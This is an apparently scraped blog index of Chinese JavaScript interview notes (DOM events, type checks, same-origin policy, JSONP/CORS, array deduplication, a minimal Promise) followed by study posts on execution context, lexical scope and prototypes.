e.preventDefault ) e.preventDefault(); //IE中阻止函数器默认动作的方式 else window.event.returnValue = false; return false; &#125; 事件注意点 event代表事件的状态，例如触发event对象的元素、鼠标的位置及状态、按下的键等等； event对象只在事件发生的过程中才有效。 firefox里的event跟IE里的不同，IE里的是全局变量，随时可用；firefox里的要用参数引导才能用，是运行时的临时变量。在IE/Opera中是window.event，在Firefox中是event；而事件的对象，在IE中是window.event.srcElement，在Firefox中是event.target，Opera中两者都可用。 123456 function a(e)&#123; var e = (e) ? e : ((window.event) ? window.event : null); var e = e || window.event; // firefox下window.event为null, IE下event为null&#125; 查找 添加 删除 替换 插入到某个节点的方法1234567891011121314151617181920212223242526// 查找节点document.getElementById('id'); // 通过id查找，返回唯一的节点，如果有多个将会返回第一个，在IE6、7中有个bug，会返回name值相同的元素，所有要做一个兼容document.getElementsByClassName('class'); // 通过class查找，返回节点数组document.getElementsByTagName('div'); // 通过标签名// 创建节点document.createDocumentFragment(); // 创建内存文档碎片document.createElement(); // 创建元素document.createTextNode(); // 创建文本节点// 添加节点var oDiv = document.createElement('div');// 插入 Dom 节点// 方法1：appendChild() 把节点插入到父节点的末尾document.body.appendChild(oDiv) // 把 div 插入到 body 中，并且位于末尾// 方法2：insertBefore() 把节点插入到父节点的某个兄弟节点的前面var oP = createElement('p'); // 创建一个 p 节点document.body.insertBefore(oP,oDiv); // 把 p 节点插入到 div 的前面// 删除节点document.body.removeChild(oP); // 删除 p 节点// 替换 Dom 节点var oSpan = document.createElement('span');document.body.replaceChild(oSpan,oBox); // 用 span 标签替换 div 标签 javaScript 的本地对象，内置对象和宿主对象内部对象 js中的内部对象包括Array、Boolean、Date、Function、Global、Math、Number、Object、RegExp、String以及各种错误类对象，包括Error、EvalError、RangeError、ReferenceError、SyntaxError和TypeError。 本地对象 Array、Boolean、Date、Function、Number、Object、RegExp、String、Error、EvalError、RangeError、ReferenceError、SyntaxError和TypeError等 new 可以实例化 内置对象 其中Global和Math这两个对象又被称为“内置对象”，这两个对象在脚本程序初始化时被创建，不必实例化这两个对象。 宿主对象 宿主环境：一般宿主环境由外壳程序创建与维护，只要能提供js引擎执行的环境都可称之为外壳程序。如：web浏览器，一些桌面应用系统等。即由web浏览器或是这些桌面应用系统早就的环境即宿主环境。 那么宿主就是浏览器自带的 document ， window 等 ###== 和=== 的不同 前者会自动转换类型，而后者不会。 比较过程： 双等号==： 如果两个值类型相同，再进行三个等号（===）的比较 如果两个值类型不同，也有可能相等，需根据以下规则进行类型转换再比较 如果一个是 null,一个是 undefined 那么相等 如果一个是字符串，一个是数值，把字符串转换成数值之后再进行比较 三等号 === ： 如果类型不同，就一定不相等 如果两个都是数值，并且是同一个值，那么相等；如果其中至少一个是 NaN,那么不相等（判断一个值是否是 NaN,只能使用 isNaN() 来判断） 如果两个都是字符串，每个位置的字符都一样，那么相等，否则不相等 如果两个值都是 true,或是 false,那么相等 如果两个值都引用同一个对象或者是函数，那么相等，否则不相等 如果两个值都是 null，或者是 undefined 那么相等。 javaScript 的同源策略同源策略的含义：脚本只能读取和所属文档来源相同的窗口和文档的属性。 同源指的是主机名、协议和端口号的组合 -同源策略.png) 同源策略带来的限制 cookie、LocalStorage 和 IndexDB无法读取 DOM 无法获取 AJAX请求无法发送 主流跨域请求解决方案 1、JSONP 实现跨域 为了便于客户端使用数据，逐渐形成了一种非正式传输协议。人们把它称作JSONP。该协议的一个要点就是允许用户传递一个callback参数给服务端，然后服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。 jsonp的核心是动态添加 script标签 来调用服务器提供的js脚本。 说说JSON和JSONP JSONP实现原理? JS 跨域请求资源会被限制。但是在页面中，script 标签跨域时，却是没有限制的（frame，img同理）。 我们通过，script的src属性，请求服务器，并通过参数（如：？callback=foo，foo为本地一个执行的方法）告诉服务器返回指定格式的JS脚本，并将数据封装在此脚本中。 服务器再配合客户端返回一段脚本 （如：_ foo({“id”: 123, “name” : 张三, “age”: 17});_ ），其实返回的就是 一个客户端本地的一个可执行的方法的方法名, 并将要返回的 数据封装在了参数里 请求到资源后，本地就会执行此方法，通过对参数的处理，也就获取到了我们所要的数据。 JSONP的局限性 JSONP 方式，固然方便强大。但是他的局限性在于，它无法完成POST请求。即是我们将type改为post，在发送请求时，依然会是以Get的方式。 2、CORS跨域 CORS原理 CORS（Cross-Origin-Resource Sharing，跨院资源共享）是一种允许多种资源（图片，Css文字，Javascript等）在一个Web页面请求域之外的另一个域的资源的机制。跨域资源共享这种机制让Web应用服务器支持跨站访问控制，从而使得安全的进行跨站数据传输成为了可能。 通过这种机制设置一系列的响应头，这些响应头允许浏览器与服务器进行交流，实现资源共享。 各语言设置响应头的方法 CORS 解决方案相对于JSONP 更加灵活，而且支持POST请求，是跨域的根源性解决方案 3、代理层 JSONP 和CORS 是主流的 跨域问题 的解决方案。除了他们呐，还有一种解决方案，就是代理层。简要说一下 JS 调用本源的后台的方法（这样就不存在跨域的问题），而通过后台（任何具有网络访问功能的后台语言，ASP.NET ,JAVA,PHP等）去跨域请求资源，而后将结果返回至前台。 另外也可以看看 同源策略 JavaScript的同源策略 Redirect 1 编写一个数组去重的方法12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 方法1 双重循环，逐个判断数组中某个元素是否与其他元素相同，相同则去掉，并且索引减1，重复执行直到双重遍历完成function DuplicateRemoval(arr)&#123; for(var i = 0; i &lt; arr.length-1; i++)&#123; for(var j = i + 1; j &lt; arr.length; j++)&#123; if(arr[i] == arr[j])&#123; arr.splice(j,1); j--; &#125; &#125; &#125; return arr;&#125;var arr=[1,1,3,4,2,4,7];console.log(DuplicateRemoval(arr));// 方法2 借助 indexOf() 方法判断此元素在该数组中首次出现位置下标与循环的下标是否相同function DuplicateRemoval(arr)&#123; for(var i = 0; i &lt; arr.length; i++)&#123; if(arr.indexOf(arr[i]) !== i)&#123; arr.splice(i,1); i-- &#125; &#125; return arr;&#125;var arr=[1,1,3,4,2,4,7];console.log(DuplicateRemoval(arr)); // 方法3 利用数组的方法 filter()var arr=[1,1,3,4,2,4,7];var result = arr.filter( (element, index, self) =&gt; self.indexOf(element) === index );console.log(result);// 方法4 利用新数组 通过indexOf判断当前元素在数组中的索引如果与循环相同则添加到新数组中var arr=[1,1,3,4,2,4,7];function Add(arr)&#123; var result = []; for(var i = 0; i &lt; arr.length; i++)&#123; if(arr.indexOf(arr[i]) === i)&#123; result.push(arr[i]); &#125; &#125; return result;&#125;console.log(Add(arr));// 方法5 ES6方法 Set() Set函数可以接受一个数组（或类似数组的对象）作为参数，用来初始化。var arr=[1,1,3,4,2,4,7];console.log([...new Set(arr)]); JavaScript 的数据类型都有什么基本数据类型：String,Boolean,number,undefined,object,Null 引用数据类型：Object（Array,Date,RegExp,Function） 类型检测typeoftypeof 运算精度只能是基础类型也就是 number ， string ，undefined ， boolean ， object ，要注意的是 null 和数组使用 typeof 运算符得到的也是 object 12345678console.log(typeof 123); // numberconsole.log(typeof 'type'); // stringconsole.log(typeof null); // objectconsole.log(typeof undefined); // undefinedconsole.log(typeof true); // booleanconsole.log(typeof []); // objectconsole.log(typeof &#123;&#125;); // objectconsole.log(typeof function()&#123;&#125;); // function instanceof用于判断一个变量是否某个对象的实例,或用于判断一个变量是否某个对象的实例 instanceof 运算符可以精确到是哪一种类型的引用,但 instanceof也有一个缺陷就是对于直接赋值的数字，字符串，布尔值以及数组是不能将其识别为Number，String，Boolean，Array。 123456console.log(123 instanceof Number); // falseconsole.log('type' instanceof String); // falseconsole.log(true instanceof Boolean); // falseconsole.log([] instanceof Array); // trueconsole.log(&#123;&#125; instanceof Object); // trueconsole.log(function()&#123;&#125; instanceof Function); // true toString.call()12345678console.log(toString.call(123) ); // [object Number]console.log(toString.call('type')); // [object String]console.log(toString.call(null)); // [object Null]console.log(toString.call(undefined)); // [object Undefined]console.log(toString.call(true)); // [object Boolean]console.log(toString.call([])); // [object Array]console.log(toString.call(&#123;&#125;)); // [object Object]console.log(toString.call(function()&#123;&#125;)); // [object Function] constructor构造函数的属性 用来判别对创建实例对象的函数的引用，另外 constructor 可以被改写 12345678910111213var number = 123,string = 'type',boolean = true,arr = [],obj = &#123;&#125;,fn = function()&#123;&#125;;console.log( number.constructor); // ƒ Number() &#123; [native code] &#125;console.log( string.constructor); // ƒ String() &#123; [native code] &#125;console.log( boolean.constructor); // ƒ Boolean() &#123; [native code] &#125;console.log( arr.constructor); // ƒ Array() &#123; [native code] &#125;console.log( obj.constructor); // ƒ Object() &#123; [native code] &#125;console.log( fn.constructor); // ƒ Function() &#123; [native code] &#125; 也可以用 constructor.name就会返回函数名 Object.prototype.toString.call()这个方法其实跟上面 toString()是一样的，只是上面那个方法有可能会被重写。所以用这个比较稳妥，所有对象都包含有一个内部属性[[Class]]，这个属性不能直接访问，但是我们可以通过Object.prototype.toString.call() 12345678console.log(Object.prototype.toString.call(123) ); // [object Number]console.log(Object.prototype.toString.call('type')); // [object String]console.log(Object.prototype.toString.call(null)); // [object Null]console.log(Object.prototype.toString.call(undefined)); // [object Undefined]console.log(Object.prototype.toString.call(true)); // [object Boolean]console.log(Object.prototype.toString.call([])); // [object Array]console.log(Object.prototype.toString.call(&#123;&#125;)); // [object Object]console.log(Object.prototype.toString.call(function()&#123;&#125;)); // [object Function] 需要注意的是IE6/7/8中 Object.prototype.toString.apply(null)返回“[object Object]”。 js 中innerText/value/innerHTML三个属性的区别12345678910111213141516171819202122&lt;div value = "3" id="target3"&gt; &lt;input type="text" value="1" id="target1"&gt; &lt;span id="target2" value="2"&gt;span&lt;/span&gt;&lt;/div&gt;&lt;script&gt;var a = document.getElementById("target1");var b = document.getElementById("target2");var c = document.getElementById("target3");console.log('----------');console.log(a.value); // 1console.log(a.innerHTML);console.log(a.innerText); console.log('----------');console.log(b.value); // undefinedconsole.log(b.innerHTML); // spanconsole.log(b.innerText); // span console.log('----------');console.log(c.value); // undefinedconsole.log(c.innerHTML); // &lt;input type="text" value="1" id="target1"&gt;&lt;span id="target2" value="2"&gt;span&lt;/span&gt;console.log(c.innerText); // span&lt;/script&gt; 总结： innerText是标签内的文本，输出的是字符串，它可以获得某个节点下面的所有标签内的文本 innerHtml 可以获得某个DOM 节点内部的 HTML 代码 value是表单元素的属性，获得是表单元素里面的值 希望获取到页面中所有的 checkbox怎么做？( ( 不使用第三方框架) ) html: 123&lt;input type="checkbox"&gt;&lt;input type="checkbox"&gt;&lt;input type="checkbox"&gt; 1234567891011window.onload = function()&#123; var domList = document.getElementsByTagName('input'); var checkBoxList = []; // 返回所有的 checkbox var len = domList.length; // 缓存到局部变量 while(len--)&#123; if(domList[len].type = 'checkbox')&#123; checkBoxList.push(domList[len]); &#125; &#125; console.log(checkBoxList); // [input, input, input]&#125; 当一个Dom节点被点击时候，我们希望能够执行一个函数，应该怎么做？12&lt;!-- 直接在 DOM 里绑定事件：--&gt;&lt;div onlick = "test()"&gt; 1234// 在js 里面通过 onclick 绑定xxx.onclick = test// 在事件里面添加绑定addEventListener(xxx, 'click', test) Javascript 的事件流模型都有什么？ “事件冒泡”：事件开始由最具体的元素接受，然后逐级向上传播 “事件捕捉”：事件由最不具体的节点先接收，然后逐级向下，一直到最具体的 “DOM 事件流”：三个阶段，事件捕捉，目标阶段。事件冒泡。 已知有字符串 foo=”get-element-by-id”,写一个 function 将其转化成驼峰表示法”——getElementById”。12345678910var foo = "get-element-by-id";function combo(msg)&#123; var arr = msg.split('-'); for(var i=1;i &lt; arr.length; i++)&#123; arr[i] = arr[i].charAt(0).toUpperCase()+arr[i].substr(1,arr[i].length-1); &#125; msg = arr.join(''); return msg;&#125;console.log(combo(foo)); // getElementById 输出今天的日期，以 YYYY-MM-DD 的方式1234567var date = new Date();var year = date.getFullYear();var month = date.getMonth() + 1;month = month &lt; 10 ? '0' + month : month;var day = date.getDate();day = day &lt; 10 ? '0' + day : day;console.log([year,month,day].join('-')) // 2018-11-01 将字符串 &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;{${$name}&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;” 中的 {$id} 替换 成 10， {$name} 替换成 Tony （使用正则表达式）12var str = '&lt;tr&gt;&lt;td&gt;&#123;$id&#125;&lt;/td&gt;&lt;td&gt;&#123;$name&#125;&lt;/td&gt;&lt;/tr&gt;';str.replace(/&#123;$id&#125;/g,10).replace(/&#123;$name&#125;/,'Tony') 为了保证页面输出安全，我们经常需要对一些特殊的字符进行转义，请写一个函数123456789101112131415161718function escapeHtml(str)&#123; return str.replace(/[&lt;&gt;”&amp;]/g,function(match)&#123; switch(match) &#123; case "&lt;": return '&amp;lt'; break; case "&gt;": return '&amp;gt' break; case "\”": return '&amp;quot' break; case "&amp;": return '&amp;amp' break; &#125; &#125;);&#125; 用 js 实现随机选择 10 -100 之间的 101234567891011var result = [];function getRandom(start,end)&#123; var choice = end - start + 1; return Math.floor(Math.random() * choice + start);&#125;for(var i = 0; i &lt; 10; i++)&#123; var arr = getRandom(10,100); result.push(arr);&#125;console.log(result.sort( (x,y) =&gt; x - y )); 把两个数组合并，并删除第二个元素1234var arr1 = ['a','b','c'];var arr2 = ['d','e','f'];var result = arr1.concat(arr2);result.splice(1,1); 请写一段 JS 程序提取URL中的各个 GET 参数( 参数名和参数个数不确定 ) ， 将其按key-value 形式返回到一个 json 结构中12345678910111213141516const url = 'http://item.taobao.com/item.htm?a=1&amp;b=2&amp;c=&amp;d=xxx&amp;e';function serilizeUrl(url)&#123; const objUrl = &#123;&#125;; if(/?/.test(url))&#123; const urlStr = url.substring(url.indexOf('?') + 1); const urlArr = urlStr.split('&amp;'); for(let i = 0; i &lt; urlArr.length; i++)&#123; const urlItem = urlArr[i]; const item = urlItem.split('='); objUrl[item[0]] = item[1]; &#125; return objUrl; &#125; return null;&#125;console.log(serilizeUrl(url)); // &#123;a: "1", b: "2", c: "", d: "xxx", e: undefined&#125; 正则构造函数与正则表示字面量Javascript中的正则表达式也是对象，我们可以使用两种方法创建正则表达式： 使用new RegExp()构造函数 使用正则表达字面量 先说结果，使用正则表达字面量的效率更高。 下面的示例代码演示了两种可用于创建正则表达式以匹配反斜杠的方法： 123456789// 正则构造函数与正则表达字面量var re = /\/gm;// 正则构造函数var reg = new RegExp('\\','gm');var foo = 'abc\123';console.log(re.test(foo)); // trueconsole.log(reg.test(foo)); // true 如上面的代码中可以看到，使用正则表达式字面量表示法时式子显得更加简短，而且不用按照类似类（class-like）的构造函数方式思考。其次，在当使用构造函数的时候，在这里要使用四个反斜杠才能匹配单个反斜杠。这使得正则表达式模式显得更长，更加难以阅读和修改。正确来说，当使用RegExp()构造函数的时候，不仅需要转义引号（即\”表示”），并且通常还需要双反斜杠（即\表示一个\）。使用new RegExp()的原因之一在于，某些场景中无法事先确定模式，而只能在运行时以字符串方式创建。 写一个函数，清除字符串前后的空格使用自带接口 trim()，考虑兼容性： 12345678if(String.prototype.trim)&#123; String.prototype.trim = function()&#123; return this.replace(/^\s+/,"").replace(/\s+$/,""); &#125;&#125;var str = '\t\n test string '.trim();console.log(str); // test string JavaScript 中 callee 和 caller的作用？caller返回一个函数的引用，这个函数调用了当前的函数 callee返回正在执行的函数本身的引用，它是arguments的一个属性 caller 使用这个属性要注意： 这个属性只有当函数执行时才有用 如果在js 程序中，函数由顶级调用，则返回 null 1234function fn()&#123; console.log(fn.caller);&#125;fn(); // null 包裹一层 123456789101112131415161718function a()&#123; fn(); function fn()&#123; console.log(fn.caller); &#125;&#125;a();/** 输出：ƒ a()&#123; fn(); function fn()&#123; console.log(fn.caller); &#125; &#125;*/ 结果为 a 函数。 再包裹一层 12345678910111213141516171819function a()&#123; b(); function b()&#123; fn(); function fn()&#123; console.log(fn.caller); &#125; &#125;&#125;a();/** 输出：ƒ b()&#123; fn(); function fn()&#123; console.log(fn.caller); &#125; &#125;*/ 结果为 b 函数 callee 要注意： 这个属性只有函数执行时才有效 它有一个 length 属性，可以用来获得形参的个数，因此可以用来比较形参和实参个数是否一致，即比较arguments.length是否等于 argument.callee.length 它可以用来传递匿名函数 a 在 b 中被调用了，但是它返回了 a 本身的引用。 下面是一个经典的阶乘函数 12345678function factorial(num)&#123; if(num &lt;= 1)&#123; return 1; &#125;else&#123; return num * factorial(num - 1) &#125;&#125;console.log(factorial(120)); 为了避免函数名修改导致内部有报错，可以修改成以下函数 1234567function factorial(num)&#123; if(num &lt;= 1)&#123; return 1; &#125;else&#123; return num * arguments.callee(num - 1) &#125;&#125; 获得形参和实参个数 12345function a(num1,num2,num3)&#123; console.log(arguments.length); // 实参长度为1 console.log(arguments.callee.length); // 形参长度为3&#125;a(1) 兔子问题如果一对兔子每月生一对兔子，一对新生兔子，从第二个月起就开始生兔子，假设每对兔子都是一雌一雄，试问一对兔子，第 N 个 月能繁殖多少成对多少对兔子（使用 callee 完成） 1234567891011121314function rabbit(num)&#123; if( num === 1)&#123; return 1; &#125;else if(num === 2)&#123; return 1; &#125;else&#123; if(result[num])&#123; return result[num]; &#125;else&#123; result[num] = arguments.callee(num-1) + arguments.callee(num-2) return result[num]; &#125; &#125;&#125; 简述创建函数的几种方式// 第一种(函数声明)： function sum1(num1,num2){ return num1 + num2; } // 第二种（函数表达式） var sum2 = function(num1,num2){ return num1 + num2; } // 匿名函数：只能自己执行自己 function(){} // 第三种（函数对象方式） var sum3 = new Function(&quot;num1&quot;,&quot;num2&quot;,&quot;return num1 + num2&quot;); 线程与进程 进程是 cpu 资源分配的最小单位，例如一个工厂 线程是 cpu 调度的最小单位，例如一个工厂里面的n个工人 浏览器内核浏览器内核中有多个进程在同步工作，今天涉及到的浏览器的进程主要有以下进程： Brower 进程、Render 进程。 Brower 主进程，主要负责页面管理以及管理其他进程的创建和销毁等，常驻的进程有： GUI 渲染线程 JS 引擎线程 事件触发线程 定时器触发线程 HTTP 请求线程 GUI 渲染线程 主要负责页面的渲染，解析 HTML、CSS 、构建 DOM 树、布局和绘制等 当界面需要重绘或者由于某种引发回流的时候，将执行该线程 该线程与 JS 引擎线程互斥，当执行 JS 引擎线程时，GUI 渲染会被挂起，当任务队列空闲时，JS 引擎才会去执行 GUI 渲染 JS 引擎线程 该线程当然是主要负责处理 JavaScript 脚本，执行代码 也是主要执行准备好待执行的事件，即定时器计数结束，或者异步请求成功并返回正确时，将依次进入任务队列，等 JS 引擎线程执行 当然，该线程与 GUI 渲染线程互斥，当 JS 引擎线程执行 JavaScript脚本时间过长，将导致页面渲染阻塞 事件触发线程 主要负责将准备好的事件交给 JS 引擎线程执行 比如 setTimeout 定时器计数结束，ajax 等异步请求成功并触发回调函数，或者用户触发点击事件时，该线程会将整装待发的事件依次加入任务队列的队尾，等待 JS 引擎线程的执行。 定时器触发线程 负责执行异步定时器一类的线程，如 setTimeout ，setInterval 主线程将依次执行代码时，遇到定时器，会将定时器交给该线程处理，当计数完毕后，事件触发线程会将计数完毕后的事件加入到任务队列的尾部，等 JS 引擎线程执行 HTTP 请求线程 负责执行异步请求一类的函数请求，如 Promise、axios、ajax 等 主线程一次执行代码，遇到异步请求，会将函数交给该线程处理，当监听到状态码的改变，如果有回调函数，事件触发线程会将回调函数加入到任务队列的尾部，等待 JS 引擎线程执行 Render 进程 浏览器渲染进程（浏览器内核），主要负责页面的渲染、JS 执行以及事件的循环。 JS 实现一个简单的 Promise12345678910111213141516171819202122232425262728293031323334353637383940414243444546const PENDING = 0;const RESOLVED = 1;const REJECTED = 2;function myPromise(func)&#123; // 保存 状态（PENDING|FULFILLED|REJECTED ） let state = PENDING; // 保存 完成后的值或者失败后的错误 let value = null; // 保存 调用成功后的回调或者失败的回调 let handlers = []; function resolve(newValue)&#123; if(newValue &amp;&amp; (typeof newValue === 'object' || typeof newValue === 'function'))&#123; let then = newValue.then; if(typeof then === 'function')&#123; return then.call(newValue,resolve); &#125; &#125; value = newValue; state = RESOLVED; setTimeout(()=&gt;&#123; handlers.forEach(handler =&gt; handle(handler)); &#125;,0) &#125; function reject(err)&#123; value = err; state = REJECTED; &#125; function handle(handler)&#123; if(state === PENDING)&#123; handlers.push(handler); return; &#125; // console.log(handler.onFullFill); // console.log(value); handler.resolve(handler.onFullFill(value)); &#125; this.then = function(onFullFill,onReject)&#123; return new myPromise((resolve,reject) =&gt;&#123; handle(&#123; resolve:resolve, onFullFill:onFullFill &#125;) &#125;) &#125; func(resolve,reject);&#125; window.onload 和 document.onDOMContentLoaded 有什么区别？具体文档load DOMContentLoaded-MDN 概括onload 事件是 DOM 事件，而 onDOMContentLoaded 是 HTML5 事件 onload 事件会被样式表、图像和自框架阻塞，而 onDOMContentLoaded 事件不会。 当加载的脚本内容并不包含立即执行DOM 操作的时候，使用 onDOMContentLoaded 事件是个更好的选择，会比 onload 事件执行时间更早 创建10个标签，并弹出对应的序号12345678910for (var i = 0; i &lt; 10; i++) &#123; (function (i) &#123; var a = document.createElement('a'); a.innerHTML = i+'&lt;br/&gt;'; a.addEventListener('click', function (e) &#123; console.log(i) &#125;); document.body.appendChild(a); &#125;)(i)&#125; CSS 与 JS 的阻塞问题 CSS 不会阻塞 DOM 的解析。但是会阻塞 DOM 的渲染 JS 阻塞 DOM 解析，但是浏览器会 “偷看” DOM,预先下载相关资源 浏览器遇到 script且没有 defer或者 async属性的标签的时候，会触发页面渲染，所有如果前面 CSS资源还没有加载完毕时，浏览器会等待它加载完毕再执行脚本。 script最好放底部， link放头部，如果头部同时拥有这两个，script最好放在link前面 参考链接： JS类型转换(强制和自动的规则) JavaScript 数据类型转换（显式与隐式） DOM标准与IE的html元素事件模型区别 ie和dom事件流的区别 前端面试题——call与apply方法的异同 JavaScript中B继承A的方法Me丶微笑 Javascript 中 作用域、闭包与 this指针 理解JAVASCRIPT的闭包 深入理解JS中的变量作用域 解决js函数闭包内存泄露问题的办法 js中的事件委托或是事件代理详解 JavaScript捕获和冒泡探讨 JS阻止冒泡和取消默认事件(默认行为) javascript原生方法对dom节点的操作，创建、添加、删除、替换、插入、复制、移动等操作 JavaScript中本地对象、内置对象和宿主对象 js中==和===区别 同源策略与JS跨域请求(图文实例详解) Js数组去重方法总结 javascript 六种数据类型（一） Javascript正则构造函数与正则表达字面量&amp;&amp;常用正则表达式 js中的caller与callee用法小实例 caller和callee的区别 事件循环机制的那些事 十几行代码教你实现一个最简版的promise window.onload 和 document.onDOMContentLoaded 有什么区别？ 原来 CSS 与 JS 是这样阻塞 DOM 解析和渲染的]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>前端面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入JavaScript—— 执行上下文栈]]></title>
    <url>%2F2019-01-12-%E6%B7%B1%E5%85%A5JavaScript%E2%80%94%E2%80%94%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E6%A0%88.html</url>
    <content type="text"><![CDATA[经一些热心网友推荐，看到了冴羽 的深入系列，现做学习与记录，希望可以每天学习一篇，加强巩固自己对于 js 的理解。原仓库地址。 JavaScript深入之执行上下文栈顺序执行举个例子： 12345678var foo = function()&#123; console.log('foo1');&#125;foo(); // foo1var foo = function()&#123; console.log('foo2');&#125;foo(); // foo2 另一个例子： 123456789var foo = function()&#123; console.log('foo1');&#125;foo(); // foo2function foo()&#123; console.log('foo2');&#125;foo(); // foo2 JavaScript 引擎并非一行一行地分析和执行程序的，而是一段一段分析执行。当执行一段代码的时候，会进行一个“准备工作”。比如第一个例子中的，变量提升。和第二个例子中的函数提升。 可执行代码分为三种：全局代码、函数代码和 eval 代码 举个例子。当执行到一个函数的时候，会进行准备工作，也就是我们经常听到的 “执行上下文（execution context）” 执行上下文栈JavaScript 引擎创建了执行上下文（Execution context stack,ECS）来管理执行上下文，为了模拟执行上下文栈的行为，让我们定义执行上下文是一个数组： 1ECStack = []; 当 JavaScript 开始要解释执行代码的时候，最先遇到的是全局代码，所以初始化的时候会首先向执行上下文栈压如一个全局执行上下文，我们用 globalContext 表示它，并且只有当整个应用程序结束的时候，ECStack 才会被清空，所以当程序结束之前，ECStack 最底部永远有一个 globalContext： 123ECStack = [ globalContext] 现在 JavaScript 遇到下面这段代码： 12345678910function func3()&#123; console.log('func3');&#125;function func2()&#123; func3();&#125;function func1()&#123; func2();&#125;func1(); 当执行一个函数的时候，就会创建一个上下文，并且压入执行上下文栈，当函数执行完毕的时候，就会将函数的执行上下文从栈中弹出，知道了这样的工作原理之后，让我们来看看如何处理上面这段代码： 1234567891011121314151617181920// 伪代码// func1()ECStack.push(&lt;func1&gt; functionContext);// func1 中竟然调用了 func2，还要创建 func2 的执行上下文ECStack.push(&lt;func2&gt; functionContext);// func2 还调用了func3ECStack.push(&lt;func3&gt; functionContext);// func3 执行完毕ECStack.pop();// func2 执行完毕ECStack.pop();// func1 执行完毕ECStack.pop();// javascript 接着执行下面的代码，但是 ECStack 底层永远有个 globalContext 解答思考题123456789101112131415161718function checkscope()&#123; var scope = "local scope"; function f()&#123; return scope; &#125; return f();&#125;checkscope();var scope = "global scope";function checkscope()&#123; var scope = "local scope" function f()&#123; return scope; &#125; return f;&#125;checkscope()(); 两段代码不一样的地方主要体现在执行上下文栈的不一样 模拟第一段代码： 1234ECStack.push(&lt;checkscope&gt; functionContext)ECStack.push(&lt;f&gt; functionContext)ECStack.pop();ECStack.pop(); 模拟第二段代码： 1234ECStack.push(&lt;checkscope&gt; functionContext)ECStack.pop();ECStack.push(&lt;f&gt; functionContext)ECStack.pop();]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>深入JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入JavaScript—— 作用域与动态作用域]]></title>
    <url>%2F2019-01-11-%E6%B7%B1%E5%85%A5JavaScript%E2%80%94%E2%80%94%E4%BD%9C%E7%94%A8%E5%9F%9F%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F.html</url>
    <content type="text"><![CDATA[经一些热心网友推荐，看到了冴羽 的深入系列，现做学习与记录，希望可以每天学习一篇，加强巩固自己对于 js 的理解。原仓库地址。 JavaScript深入之词法作用域和动态作用域作用域作用域是指程序源代码中定义变量的区域。 作用域规定了如何查找变量，也就是确定当前执行代码对变量的访问权限。 JavaScript 采用词法作用域（lexical scoping），也就是静态作用域。 静态作用域与动态作用域因为 JavaScript 采用的是词法作用域，函数的作用域在函数定义的时候就决定了。而与词法作用域相对的是动态作用域，函数的作用域是在函数调用的时候才决定的。下面举个例子 1234567891011var value = 1;function foo()&#123; console.log(value);&#125;function bar()&#123; var value = 2; foo();&#125;bar(); // 结果是什么？ 假设 JavaScript 采用静态作用域，让我们分析一下执行过程： 执行 foo 函数，先从 foo 函数内部查找是否有局部变量 value,如果没有，就根据书写的位置，查找上一层的代码，也就是 value 等于 1，所以结果会打印 1. 假设 JavaScript 采用的是动态作用域，让我们分析以下执行过程： 执行 foo 函数，依然是从 foo 函数内部查找是否有局部变量 value,如果没有，就从调用函数的作用域，也就是从 bar 函数内部查找 value 变量，所以打印结果是 2. 前面我们说了，JavaScript 采用的是 静态作用域，所以这里的打印结果是 1. 动态作用域bash 就是动态作用域 思考题看一个 《JavaScript 权威指南》 的例子 12345678910111213141516171819function checkscope()&#123; var scope = "local scope"; function f()&#123; return scope; &#125; return f();&#125;checkscope();var scope = "global scope";function checkscope()&#123; var scope = "local scope" function f()&#123; return scope; &#125; return f;&#125;checkscope()(); 两段代码打印出来的都是：local scope ，因为 JavaScript 采用的是词法作用域 ，函数的作用域基于函数创建的位置。 JavaScript 函数的执行用到了作用域链，这个作用域链是在函数定义的时候创建的。嵌套在函数 f（）定义在这个作用域链里，其中的变量 scope 一定是局部变量，不管何时何地执行函数 f（）,这种绑定在执行 f（）时依然有效。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>深入JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入JavaScript——从原型到原型链]]></title>
    <url>%2F2019-01-10-%E6%B7%B1%E5%85%A5JavaScript%E2%80%94%E2%80%94%E4%BB%8E%E5%8E%9F%E5%9E%8B%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%93%BE.html</url>
    <content type="text"><![CDATA[经一些热心网友推荐，看到了冴羽 的深入系列，现做学习与记录，希望可以每天学习一篇，加强巩固自己对于 js 的理解。原仓库地址。 JavaScript深入之从原型到原型链构造函数创建对象1234function Person()&#123;&#125;var person = new Person();person.name = 'K';console.log(person.name); 'K' 在这个例子中，Person 就是一个构造函数，我们使用 new 创建了一个实例对象 person。 prototype每个函数都是一个 prototype属性，而且 prototype是函数才有的属性。例如： 123456function Person()&#123;&#125;Person.prototype.name = 'K';var person1 = new Person();var person2 = new Person()；console.log(person1.name); // Kconsole.log(person2.name) // K 那这个函数的 prototype 属性的指向是什么？是这个函数的原型吗？ 其实，函数的 prototype 属性指向了一个对象，这个对象正是调用该构造函数而创建的实例的原型，也就是这个例子中的 person1 和 person2 的原型。原型指的是每个 JavaScript 对象（null除外）在创建的时候会与之关联另一个对象，这个对象就是我们说的原型，每一个对象都会从原型“继承”属性。 123 prototype Person --------------- Person.prototype(构造函数) (实例原型) 上面中，用 Object.prototype 表示实例原型 那么实例与实例原型，也就是 person 和 Person.prototype 之间有什么关系呢，这个时候就要说到第二个属性 __proto__这个每一个 JavaScript对象(除了null)都具有的一个属性，叫做 __proto__，这个属性会指向该对象的原型。 123function Person()&#123;&#125;var person = new Person();console.log(person.__proto__ === Person.prototype); //true 更新关系图： 既然实例对象和构造函数都可以指向原型，那么原型是否有属性指向构造函数或者实例呢？ constructor指向实例是没有的，因为一个构造函数可以生成多个实例，但是原型指向构造函数倒是有的。每个原型都有一个 constructor 属性指向关联的构造函数。 